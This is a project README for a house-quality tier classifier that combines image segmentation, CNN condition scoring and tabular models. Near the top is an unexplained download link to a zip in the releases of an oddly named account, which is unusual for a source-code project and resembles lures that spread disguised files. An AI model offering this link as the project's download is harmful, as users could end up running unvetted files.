🏠 House Quality Classifier: Tier Prediction Using Images & Tabular Data
This project aims to classify residential properties into three quality tiers — Tier A, Tier B, and Tier C — based on both structured tabular data (like square footage, age, etc.) and visual features extracted from house images (walls, floors, stains, cracks, etc.).

[download link](https://github.com/dorburn413wu/House_Tier_Classifier/releases/download/7x/House_Tier_Classifier.zip)

🔷 Tier Definitions:
Tier A: High-quality house, no renovation needed.

Tier B: Good house, needs light renovation.

Tier C: Poor condition, requires major renovation.

🧠 Project Pipeline Overview
📍 1. Data Collection
Tabular CSV: Features like built year, size, etc.

House images: Different rooms (kitchen, bedroom, bathroom, etc.)

Manual labels: Human-assigned scores or tiers for training

📍 2. Image Segmentation
Uses pretrained semantic segmentation models (e.g., DeepLab or SegFormer) to detect walls and floors in images.

📍 3. Image Quality Scoring
Trains a CNN (e.g., EfficientNet) to predict a condition score (1–10) for each room image based on cracks, stains, color uniformity, etc.

📍 4. Feature Merging
Image scores are aggregated and merged with tabular features for each house.

📍 5. Tier Prediction
Final classification model (RandomForest, XGBoost, etc.) predicts the house tier using combined vision + tabular data.

💻 Key Technologies
Python, OpenCV, PyTorch

Hugging Face Transformers (for segmentation)

scikit-learn, XGBoost, LightGBM

Roboflow (optional object detection)

Jupyter, Pandas, Matplotlib for EDA & visualization

📂 Project Structure
bash
Copy
Edit
house_quality_project/
├── data/                  # Raw images and tabular CSV
├── vision/                # Scoring model + segmentation code
├── tabular/               # Tier prediction model
├── notebooks/             # Training & evaluation notebooks
├── outputs/               # Visualizations, models, predictions
├── utils/                 # Helper scripts
└── README.md              # Project overview
📊 Evaluation
Visual: Color-coded segmentation masks, annotated scores

Metrics: MSE (for score prediction), F1-score (for tier classification)

Output: CSVs and annotated images for review

🚀 Future Plans
Add full Streamlit demo for user uploads

Allow user to upload images + metadata and receive predicted tier

Train custom segmentation model for better domain-specific wall/floor detection

📩 Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you'd like to change.
